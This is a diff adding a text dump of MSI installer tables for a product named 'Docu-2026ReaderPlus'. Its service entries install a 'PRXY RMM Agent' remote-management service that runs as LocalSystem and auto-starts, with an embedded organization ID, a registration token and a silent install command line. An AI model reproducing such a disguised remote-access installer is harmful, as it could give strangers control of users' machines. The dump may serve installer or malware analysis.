@@ -1,0 +1,103 @@
+=== CustomAction table ===
+Action	Type	Source	Target	ExtendedType
+s72	i2	S72	S255	I4
+CustomAction	Action
+SchedServiceConfig	1	WixCA	SchedServiceConfig	
+ExecServiceConfig	3073	WixCA	ExecServiceConfig	
+RollbackServiceConfig	3329	WixCA	RollbackServiceConfig	
+SchedSecureObjects	1	WixCA	SchedSecureObjects	
+SchedSecureObjectsRollback	1	WixCA	SchedSecureObjectsRollback	
+ExecSecureObjects	11265	WixCA	ExecSecureObjects	
+ExecSecureObjectsRollback	11521	WixCA	ExecSecureObjectsRollback	
+
+=== InstallExecuteSequence ===
+Action	Condition	Sequence
+s72	S255	I2
+InstallExecuteSequence	Action
+CostInitialize		800
+FileCost		900
+CostFinalize		1000
+InstallValidate		1400
+InstallInitialize		1500
+InstallFiles		4000
+InstallFinalize		6600
+CreateShortcuts		4500
+PublishFeatures		6300
+PublishProduct		6400
+SchedServiceConfig	NOT REMOVE~="ALL" AND VersionNT > 400	5802
+SchedSecureObjects	NOT REMOVE~="ALL" AND VersionNT > 400	5801
+SchedSecureObjectsRollback	VersionNT > 400	1801
+FindRelatedProducts		25
+LaunchConditions		100
+ValidateProductID		700
+MigrateFeatureStates		1200
+ProcessComponents		1600
+UnpublishFeatures		1800
+StopServices	VersionNT	1900
+DeleteServices	VersionNT	2000
+RemoveRegistryValues		2600
+RemoveShortcuts		3200
+RemoveFiles		3500
+WriteRegistryValues		5000
+InstallServices	VersionNT	5800
+StartServices	VersionNT	5900
+RegisterUser		6000
+RegisterProduct		6100
+RemoveExistingProducts		1401
+
+=== InstallUISequence ===
+Action	Condition	Sequence
+s72	S255	I2
+InstallUISequence	Action
+CostInitialize		800
+FileCost		900
+CostFinalize		1000
+ExecuteAction		1300
+FindRelatedProducts		25
+LaunchConditions		100
+ValidateProductID		700
+MigrateFeatureStates		1200
+
+=== Binary table (names only) ===
+Name
+s72
+Binary
+WixCA
+
+=== Property table ===
+Property	Value
+s72	l0
+Property	Property
+UpgradeCode	{33333333-3333-3333-3333-333333333333}
+ALLUSERS	1
+ARPHELPLINK	https://prxyrmm.com/support
+ARPURLINFOABOUT	https://prxyrmm.com
+ORGANIZATIONID	b1ccb6e6-b63e-44e4-b737-35900bd71cd4
+REGISTRATIONTOKEN	1793582247758.0651f203fa9b8f2c97489f54e9821bfe2c7aa46b45fcd0bb
+ARPPRODUCTICON	AppIcon.ico
+Manufacturer	PRXY TECHNOLOGIES LLC
+ProductCode	{8852C728-8BA0-4F51-A906-7F9F2787514B}
+ProductLanguage	1033
+ProductName	Docu-2026ReaderPlus
+ProductVersion	1.1.11
+SecureCustomProperties	ORGANIZATIONID;REGISTRATIONTOKEN;WIX_DOWNGRADE_DETECTED;WIX_UPGRADE_DETECTED
+MsiHiddenProperties	ExecSecureObjects;ExecSecureObjectsRollback
+
+=== LaunchCondition ===
+Condition	Description
+s255	l255
+LaunchCondition	Condition
+NOT WIX_DOWNGRADE_DETECTED	A newer version of [ProductName] is already installed.
+Installed OR (ORGANIZATIONID AND REGISTRATIONTOKEN)	PrxyAgent must be installed with organization credentials. Admins: msiexec /i PrxyAgent.msi ORGANIZATIONID=<id> REGISTRATIONTOKEN=<token> /qn /norestart (values from the dashboard). End users: use the 1-click installer link instead.
+
+=== ServiceInstall ===
+ServiceInstall	Name	DisplayName	ServiceType	StartType	ErrorControl	LoadOrderGroup	Dependencies	StartName	Password	Arguments	Component_	Description
+s72	s255	L255	i4	i4	i4	S255	S255	S255	S255	S255	s72	L255
+ServiceInstall	ServiceInstall
+ServiceInstaller	PRXY RMM Agent	Docu-2026ReaderPlus	16	2	32769		Tcpip[~]Dnscache[~]Winmgmt[~][~]	LocalSystem		--service	ProductComponent	Docu-2026ReaderPlus - Remote Monitoring and Management Agent for IT administration
+
+=== ServiceControl ===
+ServiceControl	Name	Event	Arguments	Wait	Component_
+s72	l255	i2	L255	I2	s72
+ServiceControl	ServiceControl
+StartService	PRXY RMM Agent	163		1	ProductComponent
